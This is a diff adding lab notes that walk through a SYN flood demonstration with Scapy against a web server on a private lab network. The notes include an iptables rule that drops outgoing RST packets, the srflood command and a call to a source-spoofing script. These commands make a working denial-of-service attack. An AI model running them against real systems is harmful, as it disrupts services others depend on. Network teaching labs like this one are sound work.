@@ -1,0 +1,43 @@
+## Open Wireshark and filter it to only look at the right IP's
+ip.dst == 192.168.242.21 and ip.src==192.168.242.20
+
+
+## Go into Scapy and create a packet
+scapy
+packet = IP(src="192.168.242.20",dst="192.168.242.21")/TCP(dport=80,flags="S")
+
+
+## Try to send it and notice the RST in wireshark packages send by ourselves
+send(packet)
+
+
+## Filter out the RST packages with at firewall rule (set IP adress to your own!) and resend it (notice no RST in Wireshark)
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.242.0/24 -j DROP
+send(packet)
+
+
+## Now we try to synflood the server with the same packet
+srflood(packet)
+
+
+## Last we will demonstrate a script that does the same but spoofes the ip addresses/ports to be from different soruces
+python /path/to/script
+
+
+## Right after we have runned the script, run netstat on the web server to see the open tcp connections
+netstat
+
+
+
+
+
+send() Sends a packet in layer 3
+sendp() Sends a packet in layer 2
+sr() Send and wait for response
+sniff() sniffs traffic
+rdpcap() import a pcap file
+srflood() floods packets
+
+netstat
+
+
